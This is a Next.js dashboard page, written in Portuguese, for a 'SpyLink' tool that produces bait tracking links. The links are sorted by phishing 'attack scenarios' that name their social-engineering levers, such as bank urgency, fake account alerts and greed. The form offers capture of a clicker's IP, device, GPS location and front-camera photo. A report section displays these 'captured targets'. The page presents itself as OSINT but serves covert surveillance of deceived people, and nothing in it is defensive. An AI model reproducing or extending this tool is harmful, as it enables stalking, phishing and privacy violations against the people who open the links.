import { db } from '@/lib/db';
import { spylinks, logs } from '@/db/schema';
import { createSpyLink } from '@/actions/spylink';
import { desc } from 'drizzle-orm';

export default async function DashboardPage() {
  const links = await db.select().from(spylinks).orderBy(desc(spylinks.createdAt));
  const allLogs = await db.select().from(logs).orderBy(desc(logs.accessedAt));

  return (
    <div className="min-h-screen bg-gray-950 text-white p-8">
      <div className="max-w-6xl mx-auto space-y-8">
        
        {/* Header */}
        <header className="flex justify-between items-center border-b border-gray-800 pb-4">
          <h1 className="text-2xl font-bold tracking-wider text-red-500">🛡️ PAINEL OSINT // SPYLINK 24H</h1>
          <span className="text-sm text-gray-400">Status: TiDB Cloud Conectado</span>
        </header>

        {/* Formulário de Criação com Categorias */}
        <div className="bg-gray-900 p-6 rounded-xl border border-gray-800 shadow-xl">
          <h2 className="text-lg font-semibold mb-4 text-gray-200">Criar Novo SpyLink Estratégico</h2>
          <form action={createSpyLink} className="space-y-4">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              <div>
                <label className="block text-sm text-gray-400 mb-1">URL Isca (Destino Final)</label>
                <input 
                  type="url" 
                  name="targetUrl" 
                  placeholder="https://exemplo.com/noticia" 
                  required
                  className="w-full bg-gray-950 border border-gray-800 rounded p-2 text-white focus:outline-none focus:border-red-500"
                />
              </div>

              <div>
                <label className="block text-sm text-gray-400 mb-1">Categoria / Cenário de Ataque</label>
                <select 
                  name="category"
                  className="w-full bg-gray-950 border border-gray-800 rounded p-2 text-white focus:outline-none focus:border-red-500"
                >
                  <option value="Bancos e Financeiro">🏦 Bancos (Urgência/Segurança)</option>
                  <option value="Notícias e Política">📰 Notícias e Política (Curiosidade)</option>
                  <option value="Jogos e Entretenimento">🎮 Jogos e Recompensas (Ganância)</option>
                  <option value="Redes Sociais">📱 Redes Sociais (Alerta de Conta)</option>
                  <option value="Vídeos e Streaming">🎬 Vídeos e Streaming (Apelo Visual)</option>
                </select>
              </div>
            </div>

            <div className="flex flex-wrap gap-6 pt-2">
              <label className="flex items-center gap-2 cursor-pointer text-sm">
                <input type="checkbox" name="captureIp" defaultChecked disabled className="accent-red-500" />
                IP e Dispositivo (Padrão)
              </label>
              <label className="flex items-center gap-2 cursor-pointer text-sm">
                <input type="checkbox" name="captureGps" className="accent-red-500" />
                Capturar Geolocalização (GPS)
              </label>
              <label className="flex items-center gap-2 cursor-pointer text-sm">
                <input type="checkbox" name="capturePhoto" className="accent-red-500" />
                Capturar Foto (Câmera Frontal)
              </label>
            </div>

            <button 
              type="submit"
              className="bg-red-600 hover:bg-red-700 font-semibold px-6 py-2 rounded text-white transition-all shadow-lg shadow-red-900/20 cursor-pointer"
            >
              Gerar Link de Inteligência
            </button>
          </form>
        </div>

        {/* Tabela de Links Ativos */}
        <div className="bg-gray-900 p-6 rounded-xl border border-gray-800 shadow-xl">
          <h2 className="text-lg font-semibold mb-4 text-gray-200">Links Ativos</h2>
          <div className="overflow-x-auto">
            <table className="w-full text-left text-sm text-gray-400">
              <thead className="border-b border-gray-800 text-gray-200">
                <tr>
                  <th className="pb-3">Link URL</th>
                  <th className="pb-3">Categoria</th>
                  <th className="pb-3">Alvo / Destino</th>
                  <th className="pb-3">Ações Ativas</th>
                  <th className="pb-3">Ação</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-800">
                {links.map((link) => (
                  <tr key={link.id} className="hover:bg-gray-850">
                    <td className="py-3 font-mono text-red-400">/v/{link.id}</td>
                    <td className="py-3 text-gray-300">{link.category}</td>
                    <td className="py-3 truncate max-w-xs">{link.targetUrl}</td>
                    <td className="py-3">
                      {link.captureGps && '📍 GPS '}
                      {link.capturePhoto && '📸 Foto '}
                      {!link.captureGps && !link.capturePhoto && '🌐 Apenas IP'}
                    </td>
                    <td className="py-3">
                      <a href={`/v/${link.id}`} target="_blank" className="text-blue-400 hover:underline">
                        Testar Link
                      </a>
                    </td>
                  </tr>
                ))}
                {links.length === 0 && (
                  <tr>
                    <td colSpan={5} className="py-4 text-center text-gray-500">Nenhum link gerado.</td>
                  </tr>
                )}
              </tbody>
            </table>
          </div>
        </div>

        {/* Relatório Visual de Alvos Capturados (Cards com fotos e dados) */}
        <div className="bg-gray-900 p-6 rounded-xl border border-gray-800 shadow-xl space-y-4">
          <h2 className="text-lg font-semibold text-gray-200">Relatório de Alvos Capturados (Fotos e Dados)</h2>
          
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
            {allLogs.map((log) => (
              <div key={log.id} className="bg-gray-950 border border-gray-800 rounded-lg p-4 space-y-3 shadow-lg">
                <div className="flex justify-between items-center text-xs text-gray-400">
                  <span className="font-mono text-red-400">Link ID: {log.spylinkId}</span>
                  <span>{new Date(log.accessedAt!).toLocaleString()}</span>
                </div>

                {/* Área da Foto Capturada */}
                <div className="flex justify-center bg-black rounded border border-gray-800 h-48 overflow-hidden relative">
                  {log.photoBase64 ? (
                    <img src={log.photoBase64} alt="Foto Capturada" className="object-cover w-full h-full" />
                  ) : (
                    <span className="text-xs text-gray-600 self-center">Nenhuma foto capturada</span>
                  )}
                </div>

                {/* Dados de IP e Dispositivo */}
                <div className="space-y-1.5 text-xs bg-gray-900 p-3 rounded border border-gray-800">
                  <p className="text-gray-300"><strong>IP:</strong> <span className="text-green-400 font-mono">{log.ip}</span></p>
                  <p className="text-gray-300"><strong>GPS:</strong> <span className="text-yellow-400">{log.gpsLocation || 'Não autorizado'}</span></p>
                  <p className="text-gray-400 truncate" title={log.userAgent!}><strong>User-Agent:</strong> {log.userAgent}</p>
                </div>
              </div>
            ))}
            
            {allLogs.length === 0 && (
              <div className="col-span-full py-8 text-center text-gray-500">
                Nenhum alvo capturado até o momento.
              </div>
            )}
          </div>
        </div>

      </div>
    </div>
  );
}